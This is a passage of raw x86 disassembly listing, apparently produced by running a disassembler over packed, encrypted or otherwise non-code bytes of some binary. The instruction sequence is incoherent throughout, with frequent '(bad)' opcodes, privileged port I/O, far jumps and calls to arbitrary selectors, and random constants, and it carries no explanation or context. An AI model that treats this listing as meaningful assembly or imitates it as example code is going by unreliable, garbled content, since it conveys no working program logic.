  41958c:	mov    ds:0xe50153e7,eax
  419591:	inc    ebx
  419592:	push   esi
  419593:	dec    edi
  419594:	out    0x91,al
  419596:	(bad)  
  419597:	pop    eax
  419598:	sub    DWORD PTR [eax+0x19fd8196],ebp
  41959e:	mov    al,0xed
  4195a0:	and    DWORD PTR [esi+0x1e],eax
  4195a3:	pop    edx
  4195a4:	scas   al,BYTE PTR es:[edi]
  4195a5:	adc    DWORD PTR [ecx],ebp
  4195a7:	jo     0x419560
  4195a9:	or     edi,DWORD PTR [esi]
  4195ab:	imul   eax,DWORD PTR [edx-0x6b],0x67
  4195af:	mov    eax,ds:0xcbdc6770
  4195b4:	sar    BYTE PTR [eax],1
  4195b6:	inc    esi
  4195b7:	sbb    ch,BYTE PTR [esi+ecx*1]
  4195ba:	push   ecx
  4195bb:	test   al,0x54
  4195bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195be:	fucomip st,st(4)
  4195c0:	jle    0x4195ba
  4195c2:	ss popf 
  4195c4:	xchg   DWORD PTR [eax+0x5da2e744],edx
  4195ca:	or     DWORD PTR [eax+0x26],ebp
  4195cd:	leave  
  4195ce:	lods   al,BYTE PTR ds:[esi]
  4195cf:	mov    ds:0x138f52e9,eax
  4195d4:	dec    esp
  4195d5:	dec    eax
  4195d6:	inc    ebx
  4195d7:	test   edi,ebp
  4195d9:	xor    DWORD PTR [ecx+0x5c005f20],0x1b
  4195e0:	pop    esp
  4195e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195e2:	ss xor eax,esp
  4195e5:	jo     0x419655
  4195e7:	aad    0xeb
  4195e9:	pop    ss
  4195ea:	jnp    0x41965d
  4195ec:	pavgb  mm0,QWORD PTR [eax-0x22917f9d]
  4195f3:	fs jecxz 0x4195b7
  4195f6:	mov    ebx,0x5cc9ca79
  4195fb:	adc    BYTE PTR [ecx+0x39],bh
  4195fe:	fcomp  QWORD PTR [edx+ebx*8]
  419601:	mov    esi,0x8d4c9333
  419606:	or     cl,ah
  419608:	fucom  st(3)
  41960a:	xchg   edi,eax
  41960b:	mov    ebx,0xf6bca41c
  419610:	xor    esp,esp
  419612:	cmp    bl,BYTE PTR [esi-0x1809c676]
  419618:	mov    al,0x6f
  41961a:	rcr    BYTE PTR [esp+eiz*4+0x45],0x78
  41961f:	cmp    eax,0x13b8ef2a
  419624:	cmp    BYTE PTR [esp+edi*8+0x31225feb],bh
  41962b:	(bad)  
  41962d:	iret   
  41962e:	fs and bl,0x14
  419632:	and    dh,BYTE PTR [ecx]
  419634:	lahf   
  419635:	mov    ecx,0x4fa4a3a
  41963a:	ret    0xc19d
  41963d:	mov    ds,eax
  41963f:	scas   al,BYTE PTR es:[edi]
  419640:	clc    
  419641:	call   FWORD PTR [ebx-0x76838080]
  419647:	stos   BYTE PTR es:[edi],al
  419648:	mov    dl,0xc3
  41964a:	jns    0x4195d0
  41964c:	add    bl,al
  41964e:	lock out 0xe7,eax
  419651:	in     eax,0x3a
  419653:	iret   
  419654:	aas    
  419655:	jae    0x4195fc
  419657:	sbb    ecx,DWORD PTR [ebx-0x26d9c848]
  41965d:	jl     0x419648
  41965f:	test   DWORD PTR [edx+0x54],esi
  419662:	mov    BYTE PTR [ebx],0x2c
  419665:	adc    ebp,ebx
  419667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419668:	arpl   WORD PTR [edi+0x54],dx
  41966b:	xlat   BYTE PTR ds:[ebx]
  41966c:	mov    al,ds:0x89a5ee51
  419671:	add    eax,0x97ed100c
  419676:	inc    esi
  419677:	pop    esi
  419678:	std    
  419679:	pop    edx
  41967a:	mov    dl,cl
  41967c:	pop    ss
  41967d:	push   cs
  41967e:	mov    ebp,0xb3f14e70
  419683:	jmp    0x419666
  419685:	clc    
  419686:	je     0x419680
  419688:	pop    ebp
  419689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968a:	inc    eax
  41968b:	test   eax,0xab4d75a3
  419690:	aad    0x99
  419692:	xor    al,0x68
  419694:	aaa    
  419695:	cdq    
  419696:	test   BYTE PTR [ebx],bh
  419698:	js     0x41962c
  41969a:	xchg   esp,eax
  41969b:	jg     0x4196a8
  41969d:	dec    ebp
  41969e:	push   ebx
  41969f:	ret    
  4196a0:	adc    BYTE PTR [ebp-0x99fb48a],cl
  4196a6:	xchg   ecx,eax
  4196a7:	repz mov ch,0x46
  4196aa:	sub    DWORD PTR [ebx+eiz*2+0x2f1ef2fe],ecx
  4196b1:	scas   eax,DWORD PTR es:[edi]
  4196b2:	jecxz  0x4196ce
  4196b4:	mov    BYTE PTR [ecx-0xe187f1e],0x88
  4196bb:	pop    edi
  4196bc:	paddsw mm2,QWORD PTR [edi+0x40]
  4196c0:	imul   DWORD PTR [edx]
  4196c2:	adc    BYTE PTR [ecx],bh
  4196c4:	call   0x2873c27c
  4196c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ca:	cmp    eax,esp
  4196cc:	ds (bad) 
  4196ce:	xor    al,0x9
  4196d0:	dec    eax
  4196d1:	pop    ebp
  4196d2:	jae    0x4196df
  4196d4:	addr16 (bad) 
  4196d6:	ja     0x4196d7
  4196d8:	adc    edx,DWORD PTR [ecx+0x1a]
  4196db:	es mov eax,0xb2d656e6
  4196e1:	pop    ebx
  4196e2:	sbb    bh,bl
  4196e4:	mov    edx,0xca874a66
  4196e9:	je     0x419769
  4196eb:	outs   dx,DWORD PTR ds:[esi]
  4196ec:	imul   BYTE PTR [ebx+0x76a75f21]
  4196f2:	ds dec ebx
  4196f4:	nop
  4196f5:	pop    ds
  4196f6:	jno    0x4196b3
  4196f8:	call   0xd91a0590
  4196fd:	xchg   ebp,eax
  4196fe:	fstp   st(4)
  419700:	fadd   QWORD PTR [edi+ecx*8-0x4d234d43]
  419707:	inc    ebp
  419708:	call   0xbeef:0xed11120
  41970f:	adc    BYTE PTR [edi-0x5c],ah
  419712:	fild   WORD PTR [edx-0x46]
  419715:	test   al,0xee
  419717:	aaa    
  419718:	imul   esi,DWORD PTR [edi-0x2c],0xa113b3f2
  41971f:	stos   BYTE PTR es:[edi],al
  419720:	daa    
  419721:	pop    ss
  419722:	out    0x58,eax
  419724:	xlat   BYTE PTR ds:[ebx]
  419725:	pop    ebx
  419726:	dec    esp
  419727:	xor    dh,cl
  419729:	leave  
  41972a:	cli    
  41972b:	pop    eax
  41972c:	mov    cl,0xdb
  41972e:	call   0x9838:0x2b9857e8
  419735:	cmp    ah,BYTE PTR ds:[edx+0x152e0f52]
  41973c:	test   BYTE PTR [eax+0x3ff2eab1],dl
  419742:	arpl   bx,dx
  419744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419745:	adc    BYTE PTR ds:0xd3bd23dc,bl
  41974b:	ret    
  41974c:	ds iret 
  41974e:	jnp    0x419760
  419750:	(bad)  
  419751:	aad    0x44
  419753:	psrld  mm1,QWORD PTR [ecx+ebx*2-0x16]
  419758:	imul   ecx,DWORD PTR [edi-0x65],0xffffffdb
  41975c:	jne    0x41978d
  41975e:	in     eax,0x8e
  419760:	push   eax
  419761:	mov    cs,WORD PTR [edi+0x4bc57450]
  419767:	faddp  st(6),st
  419769:	loopne 0x41970b
  41976b:	out    0x5d,eax
  41976d:	retf   0xf30e
  419770:	mov    eax,ds:0x7d8b2767
  419775:	lds    eax,FWORD PTR [eax]
  419777:	pop    ds
  419778:	xchg   ebp,eax
  419779:	push   esp
  41977a:	push   edi
  41977b:	mov    ds:0x6ec3737c,al
  419780:	loopne 0x41978d
  419782:	mov    edi,0x8072f54b
  419787:	stos   BYTE PTR es:[edi],al
  419788:	fsubrp st(6),st
  41978a:	xor    al,0x7e
  41978c:	icebp  
  41978d:	fs inc edi
  41978f:	sbb    DWORD PTR [ecx+0x7],0x2f
  419793:	xchg   esp,eax
  419794:	jo     0x41975f
  419796:	repz mov esi,0xa492cff8
  41979c:	pop    ss
  41979d:	lea    ecx,[ecx+0x4e]
  4197a0:	(bad)  
  4197a1:	ficomp DWORD PTR [eax+0x67]
  4197a4:	push   ds
  4197a5:	inc    esp
  4197a6:	cli    
  4197a7:	imul   ebp,DWORD PTR ds:0x79fa6e6,0xaeca939b
  4197b1:	sbb    bh,dl
  4197b3:	mov    bl,0x32
  4197b5:	cmp    al,0x86
  4197b7:	not    BYTE PTR [ebx+0xac6249c]
  4197bd:	hlt    
  4197be:	pop    esi
  4197bf:	imul   eax,DWORD PTR [esi],0x5c6e9de8
  4197c5:	pop    esi
  4197c6:	jnp    0x4197c7
  4197c8:	test   DWORD PTR [edx+0x9],esp
  4197cb:	jbe    0x4197ce
  4197cd:	xchg   esi,eax
  4197ce:	in     al,dx
  4197cf:	adc    DWORD PTR [esi-0x42a20aba],esp
  4197d5:	lea    ecx,[ebp-0x1f]
  4197d8:	xor    DWORD PTR [esp+ecx*1+0x1f],eax
  4197dc:	dec    edx
  4197dd:	sbb    esi,esp
  4197df:	dec    ebx
  4197e0:	xchg   ebx,eax
  4197e1:	sbb    eax,0x2aa1e79d
  4197e6:	imul   ecx,DWORD PTR [eax],0xfffffffa
  4197e9:	or     BYTE PTR [edi+0x54],ah
  4197ec:	mov    esi,0x60adf959
  4197f1:	add    al,0xc8
  4197f3:	or     DWORD PTR [edx+0x6c],ebx
  4197f6:	pop    esi
  4197f7:	xor    al,0x79
  4197f9:	ins    DWORD PTR es:[edi],dx
  4197fa:	mov    BYTE PTR [edx+0x13489184],bh
  419800:	and    esi,DWORD PTR [edi]
  419802:	mov    esp,0x89a6e5ff
  419808:	popf   
  419809:	mov    bl,0xc1
  41980b:	(bad)
  41980e:	xchg   esp,eax
  41980f:	enter  0xd2e9,0x51
  419813:	mov    bh,0x27
  419815:	clc    
  419816:	rcl    bh,1
  419818:	pop    ebx
  419819:	or     al,0xab
  41981b:	sub    al,0xf0
  41981d:	test   al,0x4b
  41981f:	sub    bh,BYTE PTR [ecx]
  419821:	clc    
  419822:	jno    0x41984a
  419824:	pop    ds
  419825:	add    al,0x98
  419827:	(bad)  
  419828:	mov    ch,0x5e
  41982a:	bound  eax,QWORD PTR [ebx-0x1624ebcf]
  419830:	sub    eax,0xea57ab79
  419835:	int3   
  419836:	xchg   ecx,eax
  419837:	fst    DWORD PTR [ebx-0x59ac607f]
  41983d:	pop    esp
  41983e:	(bad)  
  41983f:	xor    cl,BYTE PTR [eax+0x149faa64]
  419845:	or     eax,0x76bfa7db
  41984a:	jno    0x41981a
  41984c:	adc    al,0xb4
  41984e:	jns    0x41988e
  419850:	sub    BYTE PTR [esi+0x7d],cl
  419853:	cli    
  419854:	xor    DWORD PTR [edi+ecx*1+0x2],esi
  419858:	push   esi
  419859:	inc    ecx
  41985a:	out    0xdb,eax
  41985c:	mov    al,0xa1
  41985e:	jmp    0x41988f
  419860:	pop    ds
  419861:	dec    ebp
  419862:	in     al,0xb7
  419864:	out    dx,eax
  419865:	xchg   esp,eax
  419866:	ins    DWORD PTR es:[edi],dx
  419867:	fadd   st(5),st
  419869:	in     eax,dx
  41986a:	retf   
  41986b:	mov    ?,WORD PTR [ecx+0xf]
  41986e:	test   al,0xac
  419870:	adc    BYTE PTR [ecx+0x79c9d8fc],ah
  419876:	cmp    eax,0xd067b795
  41987b:	lock bound ecx,QWORD PTR [edx-0x39]
  41987f:	pop    eax
  419880:	mov    ds,eax
  419882:	loop   0x419863
  419884:	mov    eax,0x2a177e58
  419889:	(bad)  
  41988b:	iret   
  41988c:	or     edi,DWORD PTR [ebp+0x22b40576]
  419892:	or     DWORD PTR fs:[esi],0x2c
  419896:	in     eax,0x20
  419898:	sahf   
  419899:	or     DWORD PTR [ebx+0x4b3ca0f7],0x3c82867c
  4198a3:	push   es
  4198a4:	in     eax,0x65
  4198a6:	mov    bl,0xeb
  4198a8:	pop    ebx
  4198a9:	div    DWORD PTR [esi+0x4e]
  4198ac:	shl    DWORD PTR [esi+0x78824d2c],1
  4198b2:	dec    eax
  4198b3:	dec    edx
  4198b4:	lahf   
  4198b5:	idiv   BYTE PTR [ebx+0x58220a33]
  4198bb:	and    ch,ch
  4198bd:	mov    fs,esi
  4198bf:	aas    
  4198c0:	jno    0x419941
  4198c2:	dec    esi
  4198c3:	std    
  4198c4:	pusha  
  4198c5:	mov    dh,0xa
  4198c7:	xor    DWORD PTR [edx],0x2d8ac10f
  4198cd:	int    0xac
  4198cf:	rol    BYTE PTR [eax],1
  4198d1:	repz jne 0x4198c8
  4198d4:	inc    esp
  4198d5:	cwde   
  4198d6:	dec    ebx
  4198d7:	xor    bh,BYTE PTR [ecx]
  4198d9:	mov    cl,0x4e
  4198db:	jl     0x419959
  4198dd:	mov    ebx,es
  4198df:	shr    cl,0x1d
  4198e2:	xchg   ebp,eax
  4198e3:	jmp    0xc837:0x38b06c8e
  4198ea:	cmc    
  4198eb:	leave  
  4198ec:	mov    ch,0x73
  4198ee:	loope  0x41988c
  4198f0:	and    BYTE PTR [ebp-0x37c51bce],bh
  4198f6:	outs   dx,BYTE PTR ds:[esi]
  4198f7:	mov    ds:0x83775571,eax
  4198fc:	(bad)  
  4198fd:	mov    bh,0x8a
  4198ff:	leave  
  419900:	ss in  al,dx
  419902:	les    esi,FWORD PTR [ebp+0x5169e231]
  419908:	and    al,0xd8
  41990a:	fistp  QWORD PTR ss:[eax+0x45d871fc]
  419911:	add    eax,0x490d0e2b
  419916:	out    dx,eax
  419917:	jns    0x4198cb
  419919:	xchg   ebx,eax
  41991a:	push   ecx
  41991b:	pop    edi
  41991c:	loopne 0x4198b8
  41991e:	enter  0x3704,0x53
  419922:	out    0x3e,al
  419924:	hlt    
  419925:	xchg   ebx,ecx
  419927:	fwait
  419928:	mov    bh,0x7b
  41992a:	and    eax,0x7ff2114a
  41992f:	dec    esi
  419930:	push   bp
  419932:	inc    esi
  419933:	lahf   
  419934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419935:	shr    BYTE PTR [ebx],cl
  419937:	pop    eax
  419938:	(bad)  
  419939:	test   al,0x94
  41993b:	rcl    BYTE PTR [ebp+ebp*2+0x648e7d62],0x47
  419943:	inc    esi
  419944:	mov    ebp,0x4898cdfb
  419949:	fcom   DWORD PTR [edx+0x44e988e8]
  41994f:	add    BYTE PTR [edi-0x31],ah
  419952:	mov    edx,0xdf670ef3
  419957:	push   esp
  419958:	cmp    al,0xf3
  41995a:	mov    al,0x76
  41995c:	mov    cl,0x36
  41995e:	imul   ebx,DWORD PTR [eax],0xa8201db3
  419964:	and    eax,0x9ce1e41b
  419969:	sbb    DWORD PTR [edx-0x7b388e0d],ecx
  41996f:	fs scas eax,DWORD PTR es:[edi]
  419971:	out    dx,eax
  419972:	dec    edi
  419973:	pusha  
  419974:	dec    esi
  419975:	nop
  419976:	mov    BYTE PTR [edi],dh
  419978:	mov    esp,0x399fbab
  41997d:	xchg   edi,eax
  41997e:	fwait
  41997f:	sub    DWORD PTR [esi],ebx
  419981:	out    0xb3,eax
  419983:	push   ebp
  419984:	(bad)  
  419985:	push   esp
  419986:	out    0x4d,al
  419988:	xor    edi,esp
  41998a:	nop
  41998b:	push   ecx
  41998c:	scas   eax,DWORD PTR es:[edi]
  41998d:	sbb    BYTE PTR [ebp-0x214ebfce],cl
  419993:	repnz fldenv [edi-0x41]
  419997:	enter  0xb51b,0xf8
  41999b:	add    BYTE PTR [esi+0x59fdd60a],al
  4199a1:	inc    edx
  4199a2:	mov    ch,0xa2
  4199a4:	push   ss
  4199a5:	ins    BYTE PTR es:[edi],dx
  4199a6:	mov    ds,edx
  4199a8:	ins    DWORD PTR es:[edi],dx
  4199a9:	dec    ebx
  4199aa:	jp     0x419a16
  4199ac:	fcom   QWORD PTR [ebp+0x75]
  4199af:	xor    eax,0xbf93bd6f
  4199b4:	in     al,dx
  4199b5:	repz rcl BYTE PTR [esi],cl
  4199b8:	pop    edx
  4199b9:	ss (bad) 
  4199bb:	mov    cl,0x88
  4199bd:	shr    DWORD PTR [ebx+esi*2-0x2],1
  4199c1:	test   DWORD PTR [ecx],esi
  4199c3:	mov    eax,0xc08f78f5
  4199c8:	inc    esi
  4199c9:	pop    es
  4199ca:	and    ebx,ebp
  4199cc:	stc    
  4199cd:	dec    ecx
  4199ce:	(bad)  
  4199cf:	mov    fs,WORD PTR [eax-0x5]
  4199d2:	pusha  
  4199d3:	adc    BYTE PTR [edi+0x3c5185a8],bl
  4199d9:	fwait
  4199da:	repz sbb DWORD PTR [esp+ebp*8-0x21],edi
  4199df:	jbe    0x419a5e
  4199e1:	jne    0x4199fe
  4199e3:	xor    eax,0xa7f2ef8b
  4199e8:	push   ecx
  4199e9:	pop    ds
  4199ea:	or     BYTE PTR [ebp+0x30],bh
  4199ed:	retf   
  4199ee:	mov    dh,0xb9
  4199f0:	pop    edi
  4199f1:	das    
  4199f2:	in     eax,dx
  4199f3:	imul   esi,DWORD PTR ds:0xae40129e,0xf49ba46b
  4199fd:	std    
  4199fe:	push   ds
  4199ff:	int3   
  419a00:	int3   
  419a01:	jl     0x419998
  419a03:	jb     0x419a63
  419a05:	mov    esp,0x40bda7a0
  419a0a:	(bad)  
  419a0b:	mov    esp,0xb7302569
  419a10:	lea    ebx,[eax+0x3a]
  419a13:	mov    ah,0xee
  419a15:	sbb    al,0x25
  419a17:	sbb    dl,BYTE PTR [eax]
  419a19:	clc    
  419a1a:	pop    ebx
  419a1b:	shl    BYTE PTR [edi],cl
  419a1d:	clc    
  419a1e:	sbb    BYTE PTR [edx+ecx*2],dh
  419a21:	mov    bl,0x6a
  419a23:	(bad)  
  419a24:	fwait
  419a25:	xchg   ebx,eax
  419a26:	inc    esp
  419a27:	int    0xfb
  419a29:	aam    0xa5
  419a2b:	arpl   WORD PTR [ecx+0x67cdf4ec],si
  419a31:	rcl    ch,1
  419a33:	pop    edi
  419a34:	xor    dh,bl
  419a36:	xchg   ebp,eax
  419a37:	mov    eax,ds:0xbcf881b0
  419a3c:	xor    ecx,ebx
  419a3e:	mov    ah,0xba
  419a40:	test   al,0xc
  419a42:	mov    esp,0xd5e964b
  419a47:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419a49:	add    DWORD PTR ss:[esi+0x40596e4d],edx
  419a50:	push   es
  419a51:	adc    ebx,DWORD PTR [edi]
  419a53:	mov    ds:0x3d99c7ae,al
  419a58:	jl     0x419ace
  419a5a:	xchg   ebx,eax
  419a5b:	fwait
  419a5c:	jnp    0x419ac2
  419a5e:	jne    0x4199f8
  419a60:	repnz (bad) 
  419a62:	xor    dl,ah
  419a64:	pop    ss
  419a65:	shl    DWORD PTR [ebx+edx*1+0x2c10116],1
  419a6c:	jbe    0x4199fb
  419a6e:	mov    bl,0xd3
  419a70:	hlt    
  419a71:	fild   WORD PTR ds:0xcb83248b
  419a77:	fist   WORD PTR [ecx+0x6ad2a92e]
  419a7d:	rol    esi,0xa1
  419a80:	add    BYTE PTR [ebx-0x78],ah
  419a83:	sub    eax,0x68a9dc13
  419a88:	sbb    al,0xd7
  419a8a:	clc    
  419a8b:	jl     0x419a39
  419a8d:	xor    ebx,DWORD PTR ds:0xa178c144
  419a93:	ficom  WORD PTR [edx+0x314ff304]
  419a99:	test   eax,0x8120f894
  419a9e:	pop    ds
  419a9f:	push   eax
  419aa0:	outs   dx,DWORD PTR ds:[esi]
  419aa1:	jle    0x419a56
  419aa3:	mov    esp,esp
  419aa5:	jnp    0x419a93
  419aa7:	fiadd  DWORD PTR [ecx+0xf]
  419aaa:	fisttp QWORD PTR [esi]
  419aac:	or     eax,DWORD PTR [esi]
  419aae:	or     eax,DWORD PTR [ebp-0x17]
  419ab1:	sbb    edi,0xded0df36
  419ab7:	aaa    
  419ab8:	push   0x1e24629f
  419abd:	inc    ebp
  419abe:	(bad)  
  419abf:	and    al,0x88
  419ac1:	ins    BYTE PTR es:[edi],dx
  419ac2:	xor    BYTE PTR [edx-0x74],bl
  419ac5:	pop    eax
  419ac6:	mov    ebp,0xe978f2d5
  419acb:	mov    edx,0x394b0350
  419ad0:	les    ecx,FWORD PTR [ebp+0x4d]
  419ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad4:	push   ebx
  419ad5:	js     0x419a7a
  419ad7:	sbb    al,0x12
  419ad9:	xor    eax,esp
  419adb:	xchg   ebx,eax
  419adc:	dec    esi
  419add:	test   DWORD PTR [esi+0x51],ebp
  419ae0:	mov    esp,?
  419ae2:	into   
  419ae3:	test   eax,0x7676e568
  419ae8:	adc    DWORD PTR [ebx+0x6c],edx
  419aeb:	out    0x9d,eax
  419aed:	sub    ebp,DWORD PTR [edi+0x25f2ea60]
  419af3:	es std 
  419af5:	dec    edx
  419af6:	sub    DWORD PTR [esi],ebp
  419af8:	lock pop edi
  419afa:	fistp  DWORD PTR [ecx+0x57]
  419afd:	addr16 pop ebp
  419aff:	jmp    0x872591fd
  419b04:	les    edx,FWORD PTR [esi+0x4322305b]
  419b0a:	mov    DWORD PTR [esp+eax*1-0x6b3782f],esi
  419b11:	xor    eax,0xee3e7068
  419b16:	int    0xea
  419b18:	je     0x419b1b
  419b1a:	ret    0x6be3
  419b1d:	fdiv   QWORD PTR [ecx-0xf]
  419b20:	stc    
  419b21:	cdq    
  419b22:	mov    DWORD PTR [esi],esi
  419b24:	xchg   edx,eax
  419b25:	rol    BYTE PTR [edx+0x29],cl
  419b28:	push   eax
  419b29:	sbb    esi,eax
  419b2b:	out    dx,eax
  419b2c:	pop    ds
  419b2d:	out    dx,al
  419b2e:	jmp    0xbcdcf334
  419b33:	mov    fs:0xb44d74af,eax
  419b39:	shr    DWORD PTR [ebp+0x657e38ef],cl
  419b3f:	add    eax,0x536622b2
  419b44:	rcl    DWORD PTR fs:[ebx-0x7a0ad6b7],0xe0
  419b4c:	and    esp,edx
  419b4e:	(bad)  
  419b4f:	js     0x419b7e
  419b51:	xor    ch,bh
  419b53:	jge    0x419ae8
  419b55:	not    DWORD PTR [edi]
  419b57:	call   0x3ea4:0x3ad75ca4
  419b5e:	pop    edi
  419b5f:	xchg   ch,bl
  419b61:	push   ebp
  419b62:	xor    eax,0xf70cc712
  419b67:	xchg   esi,eax
  419b68:	clc    
  419b69:	les    ecx,FWORD PTR [ecx]
  419b6b:	pop    ds
  419b6c:	cmp    esi,DWORD PTR [edi+0x64]
  419b6f:	sar    DWORD PTR [ebp-0x3e09d710],1
  419b75:	add    ah,cl
  419b77:	sti    
  419b78:	retf   
  419b79:	push   ss
  419b7a:	mov    bh,BYTE PTR [esp+ebp*4+0x3eef75ae]
  419b81:	std    
  419b82:	jge    0x419b47
  419b84:	jns    0x419c04
  419b86:	push   edi
  419b87:	xchg   edx,eax
  419b88:	cmp    eax,0x7bc062bc
  419b8d:	mov    ah,0xdd
  419b8f:	dec    edx
  419b90:	pop    ecx
  419b91:	and    DWORD PTR [edx-0x30],eax
  419b94:	bound  eax,QWORD PTR [ecx+0x78d97a2b]
  419b9a:	xor    edi,ebx
  419b9c:	dec    ebx
  419b9d:	sub    BYTE PTR [esi],al
  419b9f:	pop    esi
  419ba0:	push   ds
  419ba1:	jecxz  0x419c0f
  419ba3:	mov    dh,0xfe
  419ba5:	xor    BYTE PTR [ebx-0x5a310b45],ah
  419bab:	mov    bh,0x1d
  419bad:	int3   
  419bae:	out    0xb0,eax
  419bb0:	mov    ebx,0xf4115645
  419bb5:	shl    DWORD PTR [edi+0x40],1
  419bb8:	outs   dx,DWORD PTR ds:[esi]
  419bb9:	mov    bh,bh
  419bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bbc:	sbb    eax,0x9cdfbd27
  419bc1:	xor    eax,0xaca4f763
  419bc6:	add    DWORD PTR [ecx+0x65],ebp
  419bc9:	push   ecx
  419bca:	cmc    
  419bcb:	sbb    bl,BYTE PTR [esi+0x68f4a712]
  419bd1:	pop    ds
  419bd2:	mov    DWORD PTR [esi],edi
  419bd4:	or     DWORD PTR [eax-0x6e6f743e],eax
  419bda:	mov    dh,0xa
  419bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bdd:	mov    ecx,0x7498994d
  419be2:	push   ebp
  419be3:	jmp    0xb771:0x583ac9e6
  419bea:	sbb    ah,BYTE PTR ds:0xf3818612
  419bf0:	enter  0xfc90,0xce
  419bf4:	fs test eax,0xe6acb9ff
  419bfa:	out    0xa8,eax
  419bfc:	xor    al,BYTE PTR [ecx+0x75]
  419bff:	jp     0x419c31
  419c01:	jmp    0xa85e7330
  419c06:	enter  0x5b63,0xb2
  419c0a:	dec    edi
  419c0b:	mov    edi,0x78abfc1f
  419c10:	addr16 push 0xffffffbf
  419c13:	mov    ch,0x3
  419c15:	mov    cl,0x7f
  419c17:	lea    ebp,[edi-0x2c]
  419c1a:	out    0x69,eax
  419c1c:	adc    cl,BYTE PTR ds:0x658e8764
  419c22:	adc    dh,BYTE PTR [esi]
  419c24:	and    DWORD PTR [edi+eax*4-0x2e],0x7b44273e
  419c2c:	add    ebp,edi
  419c2e:	(bad)  
  419c30:	push   0xc72c18d7
  419c35:	mov    esp,DWORD PTR [edx-0xb]
  419c38:	adc    BYTE PTR [ebx-0x6],al
  419c3b:	add    ebx,ebp
  419c3d:	rcl    BYTE PTR [esi+0x3c],cl
  419c40:	in     al,dx
  419c41:	out    dx,eax
  419c42:	mov    eax,es
  419c44:	mov    dh,0x52
  419c46:	xlat   BYTE PTR ds:[ebx]
  419c47:	inc    edx
  419c48:	fidivr WORD PTR [edi-0x79]
  419c4b:	fcomp  QWORD PTR [edi]
  419c4d:	test   DWORD PTR [edi+esi*1+0x67],ebx
  419c51:	pop    edx
  419c52:	pop    edx
  419c53:	push   ds
  419c54:	sub    BYTE PTR [ecx+edx*1],dl
  419c57:	cmp    eax,0xfee4599f
  419c5c:	cmp    BYTE PTR [esi],0x62
  419c5f:	inc    esp
  419c60:	mov    ebp,0xab125471
  419c65:	push   esp
  419c66:	maxps  xmm5,xmm2
  419c69:	clc    
  419c6a:	mov    ebp,0x3628e9de
  419c6f:	out    dx,al
  419c70:	xor    ch,BYTE PTR [ebx+0x22]
  419c73:	cmp    al,0x13
  419c75:	pop    ebx
  419c76:	shl    BYTE PTR [ebp-0x52762551],0xf
  419c7d:	sbb    eax,0xb12a2e69
  419c82:	mov    esp,0x5b367cbd
  419c87:	shl    DWORD PTR [edi-0x3e68ed50],cl
  419c8d:	inc    ecx
  419c8e:	test   eax,0xcdbc1c32
  419c93:	jmp    0x128a47d6
  419c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c99:	stos   DWORD PTR es:[edi],eax
  419c9a:	mov    esi,0x8124f452
  419c9f:	jmp    0x419cda
  419ca1:	add    dh,BYTE PTR [esi+esi*1-0x33cfda00]
  419ca8:	cmp    DWORD PTR [edx],edi
  419caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cab:	mov    WORD PTR [edx],ds
  419cad:	and    cl,BYTE PTR [eax]
  419caf:	jle    0x419d10
  419cb1:	xchg   BYTE PTR [edx+ecx*1],dh
  419cb4:	or     ebp,DWORD PTR [eax]
  419cb6:	sbb    bh,BYTE PTR [esi-0x56]
  419cb9:	mov    eax,ds:0xd085a1a4
  419cbe:	adc    eax,0x755f2fc
  419cc3:	cmp    BYTE PTR [ecx+0x0],al
  419cc6:	mov    eax,ds:0xc9ae711b
  419ccb:	retf   0x643c
  419cce:	pop    eax
  419ccf:	mov    cl,0x32
  419cd1:	push   esi
  419cd2:	iret   
  419cd3:	push   0x9beb257c
  419cd8:	pop    ebp
  419cd9:	jno    0x419d42
  419cdb:	xor    BYTE PTR cs:[edi],bl
  419cde:	pushf  
  419cdf:	add    ch,bh
  419ce1:	scas   al,BYTE PTR es:[edi]
  419ce2:	jnp    0x419d56
  419ce4:	dec    esi
  419ce5:	mov    DWORD PTR [esi+ebx*8+0x207b86a7],ebx
  419cec:	pusha  
  419ced:	outs   dx,BYTE PTR ds:[esi]
  419cee:	xchg   edx,eax
  419cef:	in     al,dx
  419cf0:	adc    dl,dl
  419cf2:	fsub   QWORD PTR [esi+eiz*4]
  419cf5:	stos   BYTE PTR es:[edi],al
  419cf6:	cld    
  419cf7:	into   
  419cf8:	push   esi
  419cf9:	ds (bad) 
  419cfb:	les    esp,FWORD PTR [eax-0x23b77e49]
  419d01:	jge    0x419cd0
  419d03:	sub    ah,bl
  419d05:	daa    
  419d06:	jp     0x419d3a
  419d08:	clc    
  419d09:	sub    al,BYTE PTR [edi+eiz*8-0x33]
  419d0d:	add    esp,0xa9a0b7f1
  419d13:	push   eax
  419d14:	jmp    DWORD PTR [ecx+0x426582]
  419d1a:	jnp    0x419d02
  419d1c:	stc    
  419d1d:	jne    0x419d92
  419d1f:	ja     0x419cbb
  419d21:	imul   ebp,ecx,0x11
  419d24:	or     al,0xae
  419d26:	sbb    dh,BYTE PTR [eax-0x6e6c7d42]
  419d2c:	jle    0x419d2c
  419d2e:	mov    cl,0xe5
  419d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d31:	hlt    
  419d32:	test   BYTE PTR [edi+0x1e97d62e],0x49
  419d39:	pop    eax
  419d3a:	jo     0x419d42
  419d3c:	iret   
  419d3d:	call   0x5388b1ad
  419d42:	lea    esp,[eax]
  419d44:	shl    DWORD PTR [esi+ebx*1],0x35
  419d48:	dec    ecx
  419d49:	cmp    eax,0x2a1b0a36
  419d4e:	leave  
  419d4f:	pop    eax
  419d50:	fmul   DWORD PTR [edi-0x491f9a31]
  419d56:	fnstsw WORD PTR [ebx]
  419d58:	sub    bh,BYTE PTR ds:0x4b2c579d
  419d5e:	test   eax,eax
  419d60:	or     al,0x60
  419d62:	ficom  WORD PTR [esi+ecx*8]
  419d65:	adc    ch,cl
  419d67:	add    al,0x65
